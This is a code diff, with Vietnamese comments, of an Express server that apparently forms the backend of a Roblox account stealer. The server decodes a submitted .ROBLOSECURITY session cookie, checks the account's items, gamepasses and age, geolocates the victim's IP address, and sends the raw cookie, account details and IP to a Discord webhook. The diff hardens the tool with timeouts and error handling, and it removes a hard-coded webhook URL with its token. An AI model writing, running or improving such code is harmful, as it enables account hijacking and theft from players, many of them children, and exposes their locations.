@@ -1,7 +1,7 @@
-const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
-const { v4: uuidv4 } = require('uuid');
+import express from 'express';
+import axios from 'axios';
+import cors from 'cors';
+import { v4 as uuidv4 } from 'uuid';
 
 const app = express();
 
@@ -20,7 +20,7 @@ async function sendToWebhook(webhookUrl, data) {
             headers: {
                 'Content-Type': 'application/json'
             },
-            timeout: 30000 // Thời gian chờ 30 giây
+            timeout: 10000 // Timeout 10 giây
         });
 
         const httpCode = response.status;
@@ -42,11 +42,12 @@ async function normalRobloxReq(url, cookie, csrf) {
                 'Content-Type': 'application/json',
                 'Cookie': `.ROBLOSECURITY=${cookie}`,
                 'x-csrf-token': csrf
-            }
+            },
+            timeout: 5000
         });
         return response.data;
     } catch (error) {
-        throw new Error(error.message);
+        throw new Error(`Lỗi yêu cầu Roblox: ${error.message}`);
     }
 }
 
@@ -57,7 +58,8 @@ async function gamepass(cookie, placeId) {
         const response = await axios.get(url, {
             headers: {
                 'Cookie': `.ROBLOSECURITY=${cookie}`
-            }
+            },
+            timeout: 5000
         });
         const ownedCount = (response.data.match(/Owned/g) || []).length;
         return `___${ownedCount}___`;
@@ -77,7 +79,12 @@ app.post('/', async (req, res) => {
         }
 
         // Giải mã cookie
-        const cookie = Buffer.from(code, 'base64').toString('utf-8');
+        let cookie;
+        try {
+            cookie = Buffer.from(code, 'base64').toString('utf-8');
+        } catch (error) {
+            return res.status(400).json({ error: 'Cookie không hợp lệ' });
+        }
 
         // Sử dụng cookie trực tiếp
         const finalCookie = cookie;
@@ -105,13 +112,13 @@ app.post('/', async (req, res) => {
         const korblox = korbloxCheck.owned ? 'True' : 'False';
 
         // Lấy ngày tạo tài khoản
-        const profileResponse = await axios.get(`https://users.roblox.com/v1/users/${userInfo.id}`);
+        const profileResponse = await axios.get(`https://users.roblox.com/v1/users/${userInfo.id}`, { timeout: 5000 });
         const created = new Date(profileResponse.data.created);
         const joinDate = created.toLocaleDateString('en-GB', { day: '2-digit', month: '2-digit', year: 'numeric' });
         const daysOld = Math.floor((new Date() - created) / (1000 * 60 * 60 * 24));
 
         // Lấy lượt truy cập place
-        const placeInfo = await axios.get(`https://games.roblox.com/v2/users/${userInfo.id}/games?accessFilter=Public&sortOrder=Asc&limit=10`);
+        const placeInfo = await axios.get(`https://games.roblox.com/v2/users/${userInfo.id}/games?accessFilter=Public&sortOrder=Asc&limit=10`, { timeout: 5000 });
         const visits = placeInfo.data.data[0]?.placeVisits || 0;
 
         // Kiểm tra vote game
@@ -131,17 +138,24 @@ app.post('/', async (req, res) => {
         const am = await gamepass(finalCookie, 920587237);
 
         // Lấy thông tin IP
-        const ip = req.ip;
-        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
-        const ipJson = ipInfoResponse.data;
-        const countryCode = ipJson.countryCode.toLowerCase();
-        const countryFlag = `:flag_${countryCode}:`;
-        const ipEmbed = ` | [***${ip} ${countryFlag}***](https://ipapi.co/${ip}/json)`;
+        let ip = req.ip;
+        let countryCode = 'unknown';
+        let countryFlag = ':flag_un:';
+        let ipEmbed = ` | [***${ip} ${countryFlag}***](https://ipapi.co/${ip}/json)`;
+        try {
+            const ipInfoResponse = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 5000 });
+            const ipJson = ipInfoResponse.data;
+            countryCode = ipJson.countryCode?.toLowerCase() || 'unknown';
+            countryFlag = `:flag_${countryCode}:`;
+            ipEmbed = ` | [***${ip} ${countryFlag}***](https://ipapi.co/${ip}/json)`;
+        } catch (error) {
+            console.error('Lỗi lấy thông tin IP:', error.message);
+        }
 
         // Chuẩn bị dữ liệu webhook
         const webhookData = {
             content: '@everyone',
-            username: 'SiteName', // Thay bằng tên site của bạn
+            username: 'SiteName', // Thay bằng tên bot webhook
             avatar_url: 'icon_url', // Thay bằng URL biểu tượng
             tts: false,
             embeds: [
@@ -149,8 +163,8 @@ app.post('/', async (req, res) => {
                     title: '**```VLX - Result```**',
                     description: `[**<:Cookie:1313022426346426368> Check .ROBLOSECURITY**](https://${req.hostname}/Refresher/?cookie=${finalCookie}) | [**Rolimons**](https://www.rolimons.com/player/${userInfo.id}) <:rolimons:978559948432744468> ${ipEmbed}`,
                     type: 'rich',
-                    color: parseInt('color_hex', 16), // Thay 'color_hex' bằng mã màu hex (VD: '00ff00')
-                    footer: { text: '' },
+                    color: parseInt('00ff00', 16), // Màu xanh lá
+                    footer: { text: `Request ID: ${uuidv4()}` },
                     thumbnail: { url: thumbnail.data[0].imageUrl },
                     author: {
                         name: `${userInfo.name}\n${settings.UserAbove13 ? '13+' : '13>'} ${joinDate}`,
@@ -214,14 +228,17 @@ app.post('/', async (req, res) => {
                     description: `\n \n<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${finalCookie}\`\`\`**`,
                     type: 'rich',
                     timestamp: new Date().toISOString(),
-                    color: parseInt('color_hex', 16), // Thay 'color_hex' bằng mã màu hex
+                    color: parseInt('00ff00', 16),
                     thumbnail: { url: 'https://cdn.discordapp.com/attachments/1312464460715266169/1313027565216071730/541732.png?ex=674ea3b6&is=674d5236&hm=e1509b76f9feb7f2296e0de33bf24db2aab2f19d573b754e1b214987c235b0a7&' }
                 }
             ]
         };
 
         // Gửi tới webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1353579838941823056/GNySE4JaMjJpetiXOv_wS9QSAiLUPFfZcqYEwJPjyNe-ZFei_iQsHDoA26UFPVIq_1D4'; // Thay bằng URL webhook Discord của bạn
+        const webhookUrl = 'your_discord_webhook_url'; // Thay bằng URL webhook Discord thực tế
+        if (!webhookUrl || webhookUrl === 'your_discord_webhook_url') {
+            return res.status(500).json({ error: 'Webhook URL không được cấu hình' });
+        }
         const webhookSuccess = await sendToWebhook(webhookUrl, webhookData);
 
         if (!webhookSuccess) {
@@ -232,11 +249,8 @@ app.post('/', async (req, res) => {
         res.status(200).json({ success: true });
     } catch (error) {
         console.error('Lỗi server:', error.message);
-        res.status(500).json({ error: 'Lỗi server nội bộ' });
+        res.status(500).json({ error: `Lỗi server nội bộ: ${error.message}` });
     }
 });
 
-// Khởi động server
-app.listen(3000, () => {
-    console.log('Server đang chạy trên cổng 3000');
-});
+export default app;
